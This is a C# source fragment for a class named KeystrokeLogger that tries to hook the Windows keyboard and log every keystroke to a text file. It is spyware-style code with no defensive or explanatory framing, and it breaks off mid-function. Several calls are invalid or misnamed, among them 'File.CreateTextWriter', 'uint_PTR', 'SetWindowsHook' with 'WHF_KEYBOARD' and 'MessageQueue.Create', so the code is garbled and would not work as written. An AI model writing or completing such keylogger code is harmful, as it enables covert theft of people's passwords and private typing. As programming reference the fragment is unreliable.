using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Threading;

public class KeystrokeLogger
{
    private static string logFile = "KeystrokeLog.txt";
    private static StringBuilder log = new StringBuilder();
    private static bool isLogging = true;

    public static void StartLogging()
    {
        using (StreamWriter sw = File.CreateTextWriter(logFile))
        {
            InstallHook();
            while (isLogging)
            {
                Thread.Sleep(1);
                sw.Write(LogRead());
            }
        }
    }

    private static void InstallHook()
    {
        uint_PTR hHook = 0;
        hHook = SetWindowsHook(WHF_KEYBOARD, KeyEventHandler);

        if (hHook == 0)
        {
            Console.WriteLine("Failed to install keyboard hook.");
            return;
        }

        MessageQueue.Create(new IntPtr(0), 0);
    }

    private static uint_PTR KeyEventHandler(int h, int nCode, KBDLLHOOKSTRUCT lParam)
    {
        if (nCode == 0 && lParam == 0)
